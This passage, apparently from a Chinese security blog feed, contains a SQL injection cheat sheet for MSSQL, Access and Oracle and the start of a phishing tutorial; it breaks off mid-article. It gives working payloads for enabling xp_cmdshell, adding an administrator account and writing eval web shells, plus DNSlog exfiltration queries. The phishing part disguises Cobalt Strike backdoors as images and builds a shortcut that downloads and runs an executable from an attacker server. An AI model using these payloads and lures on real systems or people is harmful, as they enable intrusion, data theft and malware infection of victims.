src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657766248_62cf8168dbaad26776ceb.png" alt="alt text"></p><p>判断内容</p><p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p><h3 id="XP-CMDSHELL检测"><a href="#XP-CMDSHELL检测" class="headerlink" title="XP_CMDSHELL检测"></a><strong>XP_CMDSHELL检测</strong></h3><p>看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p><p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p><p>开启xpcmdshell一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL</p><p>用XP_CMDSHELL添加用户hacker：</p><p>exec master..xp_cmdshell “whoami”</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p><p>XP_CMDSHELL把用户hacker加到ADMIN组：</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p><p>学习的文档：<a href="https://www.lagou.com/lgeduarticle/38721.html">https://www.lagou.com/lgeduarticle/38721.html</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><p><a href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p><p><a href="https://blog.csdn.net/weixin_34319999/article/details/92479895">https://blog.csdn.net/weixin_34319999/article/details/92479895</a></p><h2 id="拿shell方法"><a href="#拿shell方法" class="headerlink" title="拿shell方法"></a><strong>拿shell方法</strong></h2><p>前提：</p><p>1具备sa或者dbo权限</p><p>2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）</p><h3 id="1-xp-cmdshell拿shell"><a href="#1-xp-cmdshell拿shell" class="headerlink" title="(1)xp_cmdshell拿shell"></a><strong>(1)xp_cmdshell拿shell</strong></h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p><h3 id="2-差异备份拿shell"><a href="#2-差异备份拿shell" class="headerlink" title="(2)差异备份拿shell"></a><strong>(2)差异备份拿shell</strong></h3><p>大概思路：</p><p>假设：<a href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p><p>中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\</p><p>(1) 修改数据库设置为恢复模式</p><p><a href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p><p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p><p>(2) 备份当前数据库日志到文件</p><p><a href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p><p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p><p>(3) 建立一张表和一个字段</p><p><a href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p><p>(4) 往表中插入一句话马子</p><p><a href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p><p>values中的内容一般转换为马子的hex值。</p><p>(5) 再次备份日志</p><p><a href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p><p>再次备份日志，备份路径为网站服务器的物理路径</p><p>(6) 删除表</p><p><a href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p><p>然后菜刀尝试连接<a href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p><p>参考文章：这里是借鉴大佬的笔记的总结</p><p><a href="https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT">https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><p><strong>Access注入</strong></p><p>Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p><p>sqlmap语句：python sqlmap.py -u “<a href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p><h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>判断注入点</p><p>在参数后面加 单引号</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a>‘ #页面报错</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p><p>猜字段： 1 order by 4 报错 1 order by 3 正确</p><h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a><strong>有回显：</strong></h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）</p><p>查列：and exists (select 列名 from 表名) （假设存在user、password）</p><p>?id&#x3D;3 and exists (select * from test)</p><p>?id&#x3D;3 and exists (select * from admin)</p><p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p><p>?id&#x3D;3 and exists (select username from admin) 说明存在username</p><p>?id&#x3D;3 and exists (select password from admin) 说明存在password</p><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p><p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p><h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a><strong>无回显：</strong></h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p><p>查列：and exists (select 列名 from 表名)</p><p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p><p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段(username)中第一条记录内容的第二个字符</p><p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段(username)中第二条记录内容的第一个字符</p><h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a><strong>偏移注入（回显数连续）</strong></h3><p>假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765814_62cf7fb6ed96ca3d6341d.png" alt="alt text"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin –返回到一个错误页面提示查询语句出错，因此admin表的列数为6</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p><p>因为回显如下图 28 29 30是连着的，直接在27后加表名.*</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765836_62cf7fcc12b6e7da878c0.png" alt="alt text"></p><p>爆出内容   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765847_62cf7fd738ed7ab7c3339.png" alt="alt text"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加where id &#x3D;数值，可得到更多的内容</p><h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a><strong>偏移注入（常规操作）</strong></h3><p>Access偏移注入：表名知道，列名无法获取的情况下。</p><p>存在注入点，且order by下判断出字段数为22行</p><p><strong>爆出显位</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p><p>*****<strong>号判断直到页面错误有变化</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p><p>说明admin有6个字段</p><p><strong>Access****偏移注入</strong>，基本公式为：</p><p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p><p>也就是：</p><p>* &#x3D; 6个字符</p><p>2 × * &#x3D; 12个字符</p><p>22 - 12 &#x3D; 10个字符</p><p>一级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; b.id)</p><p>二级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p><p>实战常见的表和列（也可以用sqlmap的，但是量大且效率低）</p><p>常见的表有（最后根据企业名的缩写搭配上admin、user、name）</p><p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p><p>admin_id、admin_name、admin_password</p><p>常见的列</p><p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等</p><p>oracle注入(jsp)</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765866_62cf7fea9f4e6948d11dd.png" alt="alt text"></p><h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a><strong>常规有回显注入</strong></h2><p>order by 3–</p><p>and 1&#x3D;2 union select null,null,null from dual–</p><p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F;返回正常，则第一个字段是数字型，返回错误，为字符型</p><p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F;判断显示位</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F;探测数据库版本信息</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F;查询第一个表名</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F;第二个表名</p><p>获取关键表中的列名：</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p><p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F;查看数据</p><h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a><strong>第二种常规注入</strong></h3><p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第n个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1,字段1||字段2…||字段n from 表名 where rownum&#x3D;1 –连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p><h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。</p><p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p><p>ctxsys.drithsx.sn()</p><p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p><p>dbms_xdb_version.checkin()</p><p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p><p>dbms_utility.sqlid_to_sqlhash()</p><p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p><p>XMLType()</p><p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p><h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">jsp?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) --<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765888_62cf80001865e22a5f8e0.png" alt="alt text"></p><p>username&#x3D;admin’ and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h3><p>主要用DBMS_PIPE.RECEIVE_MESSAGE</p><p>即user的第一位是”A”时，延时5秒执行。</p><p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>第二位是D时，延时5秒</p><p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a><strong>DNSlog注入</strong></h3><p>utl_inaddr.get_host_address</p><p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p><p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p><p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p><p>借鉴大佬博客：<a href="https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46">https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46</a></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a><strong>拓展</strong></h2><h2 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a><strong>Sqlite注入</strong></h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p><p>1.Sqlite-master:这个是内置系统表、相当于mysql的information_schema</p><p>但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型</p><p>2.sqlite并不支持像mysql那样的注释，但是可以通过 — 方式增加DDL注释(写shell会用到)</p><p>可参考：<a href="https://blog.csdn.net/hackzkaq/article/details/117119953">https://blog.csdn.net/hackzkaq/article/details/117119953</a></p><h2 id="Postsql注入"><a href="#Postsql注入" class="headerlink" title="Postsql注入"></a><strong>Postsql注入</strong></h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。</p><p>PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p><ul><li><p>注释符：–</p></li><li><p>延时函数：pg_sleep(3)</p></li></ul><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765907_62cf8013ada166b4cf32d.png" alt="alt text"></p><p>可参考谢公子的文章：<a href="https://blog.csdn.net/qq_36119192/article/details/104628797">https://blog.csdn.net/qq_36119192/article/details/104628797</a></p><h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a><strong>Oracle注入</strong></h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</p><p>Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p><p>参考文档学习：<a href="https://blog.csdn.net/weixin_42508548/article/details/121516504">https://blog.csdn.net/weixin_42508548/article/details/121516504</a></p><p>转自原文：<a href="https://www.freebuf.com/articles/web/339118.html#circle=on"><strong>浅谈Sql注入总结笔记整理(超详细)</strong></a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>漏洞专题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一文就学会网络钓鱼“骚”姿势</title>
    <link href="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/"/>
    <url>/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="一、什么是网络钓鱼"><a href="#一、什么是网络钓鱼" class="headerlink" title="一、什么是网络钓鱼"></a><strong>一、什么是网络钓鱼</strong></h2><p>网络钓鱼是通过伪造银行或其他知名机构向他人发送垃圾邮件，意图引诱收信人给出敏感信息(如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息)的一种攻击方式。</p><h2 id="二、网络钓鱼的基本流程"><a href="#二、网络钓鱼的基本流程" class="headerlink" title="二、网络钓鱼的基本流程"></a><strong>二、网络钓鱼的基本流程</strong></h2><p>钓鱼一般分为三个步骤：寻找大鱼，制作鱼饵和抛竿</p><p>寻找大鱼：我们的目标一般包括： HR、销售、文员等安全意识比较薄弱的人员，以及运维、开发等掌握重要资源的人员。</p><p>制作鱼饵：一个高质量鱼饵一般分为两部分，一个是邮件内容更加的逼真可信，另一个是邮件的附件尽可能伪装的正常</p><p>抛竿：最后把鱼竿抛出后就可以坐等鱼上钩了</p><h2 id="三、如何制作高质量鱼饵"><a href="#三、如何制作高质量鱼饵" class="headerlink" title="三、如何制作高质量鱼饵"></a><strong>三、如何制作高质量鱼饵</strong></h2><h3 id="0x01-自解压-RLO"><a href="#0x01-自解压-RLO" class="headerlink" title="0x01.自解压+RLO"></a><strong>0x01.自解压+RLO</strong></h3><p>制作思路：利用自解压文件的特性，解压后令其自动执行解压出来的文件，达到上线的目的，由于自解压文件后缀为exe，很容易被识破，所以我们还需使用RLO后缀反转进行一些伪装。</p><p>步骤一：用cs生成windows后门</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171109-b5868060-1f01-1.png"></p><p>步骤二：随便准备一张图片，使用WinRAR把后门和图片一块自解压</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171122-bd3837f4-1f01-1.png"></p><p>压缩文件时需在高级——自解压选项中进行一些的设置使木马的执行更加隐蔽：</p><p>常规——解压路径：C:\windows\temp</p><p>设置——解压后运行：C:\windows\temp\artifact.exe</p><p>C:\windows\temp\壁纸.jpg</p><p>模式——全部隐藏</p><p>更新——更新模式——解压并更新文件</p><p>更新——覆盖模式——覆盖所有文件</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171155-d0b6712e-1f01-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171212-db0f7cf6-1f01-1.png"></p><p>步骤三：使用resourcehacker更换文件图标,将其伪装成图片</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171324-061fa934-1f02-1.png"></p><p>步骤四：把文件重命名为壁纸gpj.exe，再使用RLO对后缀进行反转，最后效果如下</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171405-1e5ff17a-1f02-1.png"></p><p>结合邮件钓鱼等方式把“图片”放送给他人，引诱他人上钩</p><p>对方双击“图片”后，会同时执行artifact.exe和壁纸.jpg，而且上线cs</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171829-bbbbd2ea-1f02-1.png"></p><h3 id="0x02-快捷方式"><a href="#0x02-快捷方式" class="headerlink" title="0x02.快捷方式"></a><strong>0x02.快捷方式</strong></h3><p>制作思路：运行快捷键方式时，执行命令让其下载我们提前放在服务器上的后门程序并且运行</p><p>步骤一：cs生成后门，放到服务器网站目录下   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171426-2aee8424-1f02-1.png"></p><p>步骤二：创建快捷方式，在目标中写入以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">C:\Windows\System32\cmd.exe /k curl http://xxx.xxx.xxx.xxx/exe/artifact.exe --output C:\Windows\temp\win.exe &amp;&amp; C:\Windows\temp\win.exe<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171449-388e1c70-1f02-1.png"></p><p>步骤三：更换图标，增加其真实性   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171506-42ae8942-1f02-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171944-e831fafc-1f02-1.png"></p><p>当对方双击快捷键方式时就会下载我们准备好的artifact.exe并且执行</p><p><img 